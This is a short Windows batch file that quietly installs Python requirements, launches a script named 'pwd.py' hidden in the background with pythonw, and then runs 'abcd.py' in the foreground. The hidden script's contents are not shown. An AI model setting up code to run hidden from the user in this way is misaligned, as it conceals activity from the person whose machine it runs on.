@echo off

pip install -r requirements.txt -q

REM Run Python script in the background (hidden)
pythonw pwd.py

REM Run Python script in the foreground
python abcd.py
pause
